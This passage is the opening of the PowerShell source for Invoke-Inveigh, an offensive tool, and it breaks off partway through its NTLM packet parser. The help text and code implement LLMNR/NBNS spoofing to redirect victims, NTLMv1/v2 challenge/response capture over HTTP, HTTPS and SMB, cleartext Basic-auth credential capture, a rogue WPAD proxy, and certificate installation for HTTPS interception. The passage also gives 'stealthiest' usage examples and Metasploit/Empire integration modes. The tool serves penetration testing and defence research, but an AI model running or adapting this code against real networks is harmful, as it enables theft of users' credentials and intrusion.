function Invoke-Inveigh
{
<#
.SYNOPSIS
Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP/HTTPS/SMB.

.DESCRIPTION
Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with the following features:

    IPv4 LLMNR/NBNS spoofer with granular control
    NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB
    Basic auth cleartext credential capture over HTTP/HTTPS
    WPAD server capable of hosting a basic or custom wpad.dat file
    HTTP/HTTPS server capable of hosting limited content
    Granular control of console and file output
    Run time control

.PARAMETER IP
Specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the
SpooferIP parameter is not set.

.PARAMETER SpooferIP
IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to a system other
than the Inveigh host.

.PARAMETER SpooferHostsReply
Default = All: Comma separated list of requested hostnames to respond to when spoofing with LLMNR and NBNS.

.PARAMETER SpooferHostsIgnore
Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR and NBNS.

.PARAMETER SpooferIPsReply
Default = All: Comma separated list of source IP addresses to respond to when spoofing with LLMNR and NBNS.

.PARAMETER SpooferIPsIgnore
Default = All: Comma separated list of source IP addresses to ignore when spoofing with LLMNR and NBNS.

.PARAMETER SpooferLearning
Default = Disabled: (Y/N) Enable/Disable LLMNR/NBNS valid host learning. If enabled, Inveigh will send out
LLMNR/NBNS requests for any received LLMNR/NBNS requests. If a response is received, Inveigh will add the
hostname to a spoofing blacklist.

.PARAMETER SpooferLearningDelay
(Integer) Time in minutes that Inveigh will delay spoofing while valid hosts are being blacklisted through
SpooferLearning.

.PARAMETER SpooferLearningInterval
Default = 30 Minutes: (Integer) Time in minutes that Inveigh wait before sending out an LLMNR/NBNS request for a
hostname that has already been checked if SpooferLearning is enabled.   

.PARAMETER SpooferRepeat
Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user
challenge/response has been captured.

.PARAMETER LLMNR
Default = Enabled: (Y/N) Enable/Disable LLMNR spoofing.

.PARAMETER LLMNRTTL
Default = 30 Seconds: LLMNR TTL in seconds for the response packet.

.PARAMETER NBNS
Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.

.PARAMETER NBNSTTL
Default = 165 Seconds: NBNS TTL in seconds for the response packet.

.PARAMETER NBNSTypes
Default = 00,20: Comma separated list of NBNS types to spoof.
Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPS
Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
the local store and attached to port 443. If the script does not exit gracefully, execute 
"netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal"
in the cert store.

.PARAMETER HTTPAuth
Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type. This setting does not apply to
wpad.dat requests. Note that Microsoft has changed the behavior of WDAP through NBNS in the June 2016 patches. A 
WPAD enabled browser may now trigger NTLM authentication after sending out NBNS requests to random hostnames and
connecting to the root of the web server.

.PARAMETER HTTPBasicRealm
Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.

.PARAMETER HTTPDir
Full directory path to enable hosting of basic content through the HTTP/HTTPS listener.

.PARAMETER HTTPDefaultFile
Filename within the HTTPDir to serve as the default HTTP/HTTPS response file. This file will not be used for
wpad.dat requests.

.PARAMETER HTTPDefaultEXE
EXE filename within the HTTPDir to serve as the default HTTP/HTTPS response for EXE requests. 

.PARAMETER HTTPResponse
String or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat requests.
This parameter will not be used if HTTPDir is set. Use PowerShell character escapes where necessary. 

.PARAMETER HTTPSCertAppID
Valid application GUID for use with the ceriticate.

.PARAMETER HTTPSCertThumbprint
Certificate thumbprint for use with a custom certificate. The certificate filename must be located in the current
working directory and named Inveigh.pfx.

.PARAMETER WPADAuth
Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
Anonymous can prevent browser login prompts.

.PARAMETER WPADEmptyFile
Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests.
Enabling this setting can reduce the amount of redundant wpad.dat requests. This parameter is ignored when
using WPADIP, WPADPort, or WPADResponse.

.PARAMETER WPADIP
Proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used
with WPADPort.

.PARAMETER WPADPort
Proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be
used with WPADIP.

.PARAMETER WPADDirectHosts
Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the
defined proxy.

.PARAMETER WPADResponse
wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort
are set. Use PowerShell character escapes where necessary.

.PARAMETER SMB
Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still
direct targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to
prevent login requests from being processed by the Inveigh host.  

.PARAMETER Challenge
Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random
challenge will be generated for each request.

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER ConsoleOutput
Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
ensure that it doesn't hang the shell.

.PARAMETER ConsoleStatus
(Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for
displaying full capture lists when running through a shell that does not have access to the support functions.

.PARAMETER ConsoleUnique
Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time console output is enabled.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER FileUnique
Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time file output is enabled.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER OutputStreamOnly
Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh through a shell that does not return other output streams.Note that you will not see the various
yellow warning messages if enabled.

.PARAMETER OutputDir
Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must
also be enabled.

.PARAMETER RunTime
(Integer) Run time duration in minutes.

.PARAMETER StartupChecks
Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER Inspect
(Switch) Disable LLMNR, NBNS, HTTP, HTTPS, and SMB in order to only inspect LLMNR/NBNS traffic.

.PARAMETER Tool
Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Meterpreter's
PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.
0 = None, 1 = Metasploit/Meterpreter, 2 = Empire   

.EXAMPLE
Import-Module .\Inveigh.psd1;Invoke-Inveigh
Import full module and execute with all default settings.

.EXAMPLE
. ./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10
Dot source load and execute specifying a specific local listening/spoofing IP.

.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -HTTP N
Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.

.EXAMPLE
Invoke-Inveigh -SpooferRepeat N -WPADAuth Anonymous -SpooferHostsReply host1,host2 -SpooferIPsReply 192.168.2.75,192.168.2.76
Execute with the stealthiest options.

.EXAMPLE
Invoke-Inveigh -Inspect
Execute with LLMNR, NBNS, SMB, HTTP, and HTTPS disabled in order to only inpect LLMNR/NBNS traffic.

.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be
useful for sending traffic to a controlled Linux system on another subnet.

.EXAMPLE
Invoke-Inveigh -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
Execute specifying an HTTP redirect response. 

.NOTES
1. An elevated administrator or SYSTEM shell is needed.
2. Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/HTTPS/SMB NTLMv1/NTLMv2 challenge/response capture.
3. LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets.
4. SMB challenge/response captures are performed by sniffing over the host system's SMB service.
5. HTTP challenge/response captures are performed with a dedicated listener.
6. The local LLMNR/NBNS services do not need to be disabled on the host system.
7. LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
8. Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
9. Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.
10. If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

# Parameter default values can be modified in this section: 
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SMB = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LLMNR = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferLearning = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferRepeat = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WPADEmptyFile = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$HTTPAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$WPADAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$NBNSTypes = @("00","20"),
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDir = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$OutputDir = "",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
    [parameter(Mandatory=$false)][Array]$SpooferHostsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferHostsIgnore = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsIgnore = "",
    [parameter(Mandatory=$false)][Array]$WPADDirectHosts = "",
    [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
    [parameter(Mandatory=$false)][Int]$LLMNRTTL = "30",
    [parameter(Mandatory=$false)][Int]$NBNSTTL = "165",
    [parameter(Mandatory=$false)][Int]$WPADPort = "",
    [parameter(Mandatory=$false)][Int]$RunTime = "",
    [parameter(Mandatory=$false)][Int]$SpooferLearningDelay = "",
    [parameter(Mandatory=$false)][Int]$SpooferLearningInterval = "30",
    [parameter(Mandatory=$false)][String]$HTTPBasicRealm = "IIS",
    [parameter(Mandatory=$false)][String]$HTTPDefaultFile = "",
    [parameter(Mandatory=$false)][String]$HTTPDefaultEXE = "",
    [parameter(Mandatory=$false)][String]$HTTPResponse = "",
    [parameter(Mandatory=$false)][String]$HTTPSCertAppID = "00112233-4455-6677-8899-AABBCCDDEEFF",
    [parameter(Mandatory=$false)][String]$HTTPSCertThumbprint = "98c1d54840c5c12ced710758b6ee56cc62fa1f0d",
    [parameter(Mandatory=$false)][String]$WPADResponse = "",
    [parameter(Mandatory=$false)][Switch]$Inspect,
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if($inveigh.HTTP -or $inveigh.HTTPS)
{
    throw "You must stop stop other Inveigh HTTP/HTTPS listeners before running this module."
}

if(!$IP)
{ 
    $IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
}

if(!$SpooferIP)
{
    $SpooferIP = $IP  
}

if($HTTPDefaultFile -or $HTTPDefaultEXE)
{

    if(!$HTTPDir)
    {
        throw "You must specify an -HTTPDir when using either -HTTPDefaultFile or -HTTPDefaultEXE"
    }

}

if($WPADIP -or $WPADPort)
{

    if(!$WPADIP)
    {
        throw "You must specify a -WPADPort to go with -WPADIP"
    }

    if(!$WPADPort)
    {
        throw "You must specify a -WPADIP to go with -WPADPort"
    }

}

if(!$OutputDir)
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $OutputDir
}

if(!$inveigh)
{
    $global:inveigh = [HashTable]::Synchronized(@{})
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $inveigh.cleartext_list = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
    $inveigh.SMBRelay_failed_list = New-Object System.Collections.ArrayList
    $inveigh.valid_host_list = New-Object System.Collections.ArrayList
}

if($inveigh.running)
{
    throw "Invoke-Inveigh is already running, use Stop-Inveigh"
}

$inveigh.sniffer_socket = $null

if($inveigh.HTTP_listener.IsListening -and !$inveigh.relay_running)
{
    $inveigh.HTTP_listener.Stop()
    $inveigh.HTTP_listener.Close()
}

if(!$inveigh.relay_running -or !$inveigh.unprivileged_running)
{
    $inveigh.console_queue = New-Object System.Collections.ArrayList
    $inveigh.status_queue = New-Object System.Collections.ArrayList
    $inveigh.log_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    $inveigh.certificate_application_ID = $HTTPSCertAppID
    $inveigh.certificate_thumbprint = $HTTPSCertThumbprint
    $inveigh.console_output = $false
    $inveigh.console_input = $true
    $inveigh.file_output = $false
    $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
    $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
    $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
    $inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
}

$inveigh.running = $true

if($StatusOutput -eq 'Y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

if($OutputStreamOnly -eq 'Y')
{
    $inveigh.output_stream_only = $true
}
else
{
    $inveigh.output_stream_only = $false
}

if($Inspect)
{
    $LLMNR = "N"
    $NBNS = "N"
    $HTTP = "N"
    $HTTPS = "N"
    $SMB = "N"
}

if($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension
{
    $inveigh.tool = 1
    $inveigh.output_stream_only = $true
    $inveigh.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $inveigh.tool = 2
    $inveigh.output_stream_only = $true
    $inveigh.console_input = $false
    $inveigh.newline = "`n"
    $ConsoleOutput = "Y"
    $ShowHelp = "N"
}
else
{
    $inveigh.tool = 0
    $inveigh.newline = ""
}

# Write startup messages
$inveigh.status_queue.Add("Inveigh started at $(Get-Date -format 's')")  > $null
$inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh started")]) > $null

if($StartupChecks -eq 'Y')
{
    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
}

if($firewall_status)
{
    $inveigh.status_queue.Add("Windows Firewall = Enabled")  > $null
    $firewall_rules = New-Object -comObject HNetCfg.FwPolicy2
    $firewall_powershell = $firewall_rules.rules | Where-Object {$_.Enabled -eq $true -and $_.Direction -eq 1} |Select-Object -Property Name | Select-String "Windows PowerShell}"

    if($firewall_powershell)
    {
        $inveigh.status_queue.Add("Windows Firewall - PowerShell.exe = Allowed")  > $null
    }

}

$inveigh.status_queue.Add("Listening IP Address = $IP")  > $null
$inveigh.status_queue.Add("LLMNR/NBNS Spoofer IP Address = $SpooferIP")  > $null

if($LLMNR -eq 'Y')
{
    $inveigh.status_queue.Add("LLMNR Spoofer = Enabled")  > $null
    $inveigh.status_queue.Add("LLMNR TTL = $LLMNRTTL Seconds")  > $null
    $LLMNR_response_message = "- response sent"
}
else
{
    $inveigh.status_queue.Add("LLMNR Spoofer = Disabled")  > $null
    $LLMNR_response_message = "- LLMNR spoofer is disabled"
}

if($NBNS -eq 'Y')
{
    $NBNSTypes_output = $NBNSTypes -join ","
    
    if($NBNSTypes.Count -eq 1)
    {
        $inveigh.status_queue.Add("NBNS Spoofer For Type $NBNSTypes_output = Enabled")  > $null
    }
    else
    {
        $inveigh.status_queue.Add("NBNS Spoofer For Types $NBNSTypes_output = Enabled")  > $null
    }

    $inveigh.status_queue.Add("NBNS TTL = $NBNSTTL Seconds")  > $null
    $NBNS_response_message = "- response sent"
}
else
{
    $inveigh.status_queue.Add("NBNS Spoofer = Disabled")  > $null
    $NBNS_response_message = "- NBNS spoofer is disabled"
}

if($SpooferLearning -eq 'Y' -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.status_queue.Add("Spoofer Learning = Enabled")  > $null

    if($SpooferLearningDelay -eq 1)
    {
        $inveigh.status_queue.Add("Spoofer Learning Delay = $SpooferLearningDelay Minute")  > $null
    }
    elseif($SpooferLearningDelay -gt 1)
    {
        $inveigh.status_queue.Add("Spoofer Learning Delay = $SpooferLearningDelay Minutes")  > $null
    }
    
    if($SpooferLearningInterval -eq 1)
    {
        $inveigh.status_queue.Add("Spoofer Learning Interval = $SpooferLearningInterval Minute")  > $null
    }
    elseif($SpooferLearningInterval -eq 0)
    {
        $inveigh.status_queue.Add("Spoofer Learning Interval = Disabled")  > $null
    }
    elseif($SpooferLearningInterval -gt 1)
    {
        $inveigh.status_queue.Add("Spoofer Learning Interval = $SpooferLearningInterval Minutes")  > $null
    }

}

if($SpooferHostsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.status_queue.Add("Spoofer Hosts Reply = " + ($SpooferHostsReply -join ","))  > $null
}

if($SpooferHostsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.status_queue.Add("Spoofer Hosts Ignore = " + ($SpooferHostsIgnore -join ","))  > $null
}

if($SpooferIPsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.status_queue.Add("Spoofer IPs Reply = " + ($SpooferIPsReply -join ","))  > $null
}

if($SpooferIPsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.status_queue.Add("Spoofer IPs Ignore = " + ($SpooferIPsIgnore -join ","))  > $null
}

if($SpooferRepeat -eq 'N')
{
    $inveigh.spoofer_repeat = $false
    $inveigh.status_queue.Add("Spoofer Repeating = Disabled")  > $null
}
else
{
    $inveigh.spoofer_repeat = $true
}

if($SMB -eq 'Y')
{
    $inveigh.status_queue.Add("SMB Capture = Enabled")  > $null
}
else
{
    $inveigh.status_queue.Add("SMB Capture = Disabled")  > $null
}

if($HTTP -eq 'Y')
{
    
    if($StartupChecks -eq 'Y')
    {
        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:":80 "
    }

    if($HTTP_port_check)
    {
        $inveigh.HTTP = $false
        $inveigh.status_queue.Add("HTTP Capture Disabled Due To In Use Port 80")  > $null
    }
    else
    {
        $inveigh.HTTP = $true
        $inveigh.status_queue.Add("HTTP Capture = Enabled")  > $null
    }

}
else
{
    $inveigh.HTTP = $false
    $inveigh.status_queue.Add("HTTP Capture = Disabled")  > $null
}

if($HTTPS -eq 'Y')
{
    
    if($StartupChecks -eq 'Y')
    {
        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:":443 "
    }

    if($HTTPS_port_check)
    {
        $inveigh.HTTPS = $false
        $inveigh.status_queue.Add("HTTPS Capture Disabled Due To In Use Port 443")  > $null
    }
    else
    {

        try
        {
            $inveigh.HTTPS = $true
            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
            $certificate_store.Open('ReadWrite')
            $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
            $certificate.Import($PWD.Path + "\Inveigh.pfx")
            $certificate_store.Add($certificate) 
            $certificate_store.Close()
            $netsh_certhash = "certhash=" + $inveigh.certificate_thumbprint
            $netsh_app_ID = "appid={" + $inveigh.certificate_application_ID + "}"
            $netsh_arguments = @("http","add","sslcert","ipport=0.0.0.0:443",$netsh_certhash,$netsh_app_ID)
            & "netsh" $netsh_arguments > $null
            $inveigh.status_queue.Add("HTTPS Capture = Enabled")  > $null
        }
        catch
        {
            $certificate_store.Close()
            $HTTPS="N"
            $inveigh.HTTPS = $false
            $inveigh.status_queue.Add("HTTPS Capture Disabled Due To Certificate Install Error")  > $null
        }

    }

}
else
{
    $inveigh.status_queue.Add("HTTPS Capture = Disabled")  > $null
}

if($inveigh.HTTP -or $inveigh.HTTPS)
{
    $inveigh.status_queue.Add("HTTP/HTTPS Authentication = $HTTPAuth")  > $null
    $inveigh.status_queue.Add("WPAD Authentication = $WPADAuth")  > $null

    if($HTTPDir -and !$HTTPResponse)
    {
        $inveigh.status_queue.Add("HTTP/HTTPS Directory = $HTTPDir")  > $null

        if($HTTPDefaultFile)
        {
            $inveigh.status_queue.Add("HTTP/HTTPS Default Response File = $HTTPDefaultFile")  > $null
        }

        if($HTTPDefaultEXE)
        {
            $inveigh.status_queue.Add("HTTP/HTTPS Default Response Executable = $HTTPDefaultEXE")  > $null
        }

    }

    if($HTTPResponse)
    {
        $inveigh.status_queue.Add("HTTP/HTTPS Custom Response = Enabled")  > $null
    }

    if($HTTPAuth -eq 'Basic' -or $WPADAuth -eq 'Basic')
    {
        $inveigh.status_queue.Add("Basic Authentication Realm = $HTTPBasicRealm")  > $null
    }

    if($WPADIP -and $WPADPort)
    {
        $inveigh.status_queue.Add("WPAD Response = Enabled")  > $null
        $inveigh.status_queue.Add("WPAD = $WPADIP`:$WPADPort")  > $null

        if($WPADDirectHosts)
        {
            ForEach($WPAD_direct_host in $WPADDirectHosts)
            {
                $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, "' + $WPAD_direct_host + '")) return "DIRECT";'
            }

            $WPADResponse = "function FindProxyForURL(url,host){" + $WPAD_direct_hosts_function + "return `"PROXY " + $WPADIP + ":" + $WPADPort + "`";}"
            $inveigh.status_queue.Add("WPAD Direct Hosts = " + ($WPADDirectHosts -join ","))  > $null
        }
        else
        {
            $WPADResponse = "function FindProxyForURL(url,host){return `"PROXY " + $WPADIP + ":" + $WPADPort + "`";}"
        }

    }
    elseif($WPADResponse -and !$WPADIP -and !$WPADPort)
    {
        $inveigh.status_queue.Add("WPAD Custom Response = Enabled")  > $null
        $WPADResponse = $WPADResponse
    }
    elseif($WPADEmptyFile -eq 'Y')
    {
        $inveigh.status_queue.Add("WPAD Default Response = Enabled")  > $null
        $WPADResponse = "function FindProxyForURL(url,host){return `"DIRECT`";}"
    }

    if($Challenge)
    {
        $inveigh.status_queue.Add("NTLM Challenge = $Challenge")  > $null
    }

}

if($MachineAccounts -eq 'N')
{
    $inveigh.status_queue.Add("Machine Account Capture = Disabled")  > $null
    $inveigh.machine_accounts = $false
}
else
{
    $inveigh.machine_accounts = $true
}

if($ConsoleOutput -eq 'Y')
{
    $inveigh.status_queue.Add("Real Time Console Output = Enabled")  > $null
    $inveigh.console_output = $true

    if($ConsoleStatus -eq 1)
    {
        $inveigh.status_queue.Add("Console Status = $ConsoleStatus Minute")  > $null
    }
    elseif($ConsoleStatus -gt 1)
    {
        $inveigh.status_queue.Add("Console Status = $ConsoleStatus Minutes")  > $null
    }

}
else
{

    if($inveigh.tool -eq 1)
    {
        $inveigh.status_queue.Add("Real Time Console Output Disabled Due To External Tool Selection")  > $null
    }
    else
    {
        $inveigh.status_queue.Add("Real Time Console Output = Disabled")  > $null
    }

}

if($ConsoleUnique -eq 'Y')
{
    $inveigh.console_unique = $true
}
else
{
    $inveigh.console_unique = $false
}

if($FileOutput -eq 'Y')
{
    $inveigh.status_queue.Add("Real Time File Output = Enabled")  > $null
    $inveigh.status_queue.Add("Output Directory = $output_directory")  > $null
    $inveigh.file_output = $true
}
else
{
    $inveigh.status_queue.Add("Real Time File Output = Disabled")  > $null
}

if($FileUnique -eq 'Y')
{
    $inveigh.file_unique = $true
}
else
{
    $inveigh.file_unique = $false
}

if($RunTime -eq 1)
{
    $inveigh.status_queue.Add("Run Time = $RunTime Minute")  > $null
}
elseif($RunTime -gt 1)
{
    $inveigh.status_queue.Add("Run Time = $RunTime Minutes")  > $null
}

if($ShowHelp -eq 'Y')
{
    $inveigh.status_queue.Add("Run Stop-Inveigh to stop Inveigh")  > $null
        
    if($inveigh.console_output)
    {
        $inveigh.status_queue.Add("Press any key to stop real time console output")  > $null
    }

}

if($inveigh.status_output)
{

    while($inveigh.status_queue.Count -gt 0)
    {

        if($inveigh.output_stream_only)
        {
            Write-Output($inveigh.status_queue[0] + $inveigh.newline)
            $inveigh.status_queue.RemoveAt(0)
        }
        else
        {

            switch -Wildcard ($inveigh.status_queue[0])
            {

                "* Disabled Due To *"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

                "Run Stop-Inveigh to stop Inveigh"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

                "Windows Firewall = Enabled"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

                default
                {
                    Write-Output($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

            }

        }

    }

}

# Begin ScriptBlocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{

    function DataToUInt16($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt16($field,0)
    }

    function DataToUInt32($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt32($field,0)
    }

    function DataLength2
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)
        return $string_length
    }

    function DataLength4
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt32($string_extract_data[$length_start..($length_start + 3)],0)
        return $string_length
    }

    function DataToString
    {
        param ([Int]$string_start,[Int]$string_length,[Byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[$string_start..($string_start + $string_length - 1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }

}

# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
$SMB_NTLM_functions_scriptblock =
{

    function SMBNTLMChallenge
    {
        param ([Byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")

        if($NTLM_index -gt 0 -and $payload.SubString(($NTLM_index + 16),8) -eq "02000000")
        {
            $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
        }

        return $NTLM_challenge
    }

    function SMBNTLMResponse
    {
        param ([Byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLMSSP_hex_offset = $payload.IndexOf("4E544C4D53535000")

        if($NTLMSSP_hex_offset -gt 0 -and $payload.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
        {
            $NTLMSSP_offset = $NTLMSSP_hex_offset / 2

            $LM_length = DataLength2 ($NTLMSSP_offset + 12) $payload_bytes
            $LM_offset = DataLength4 ($NTLMSSP_offset + 16) $payload_bytes
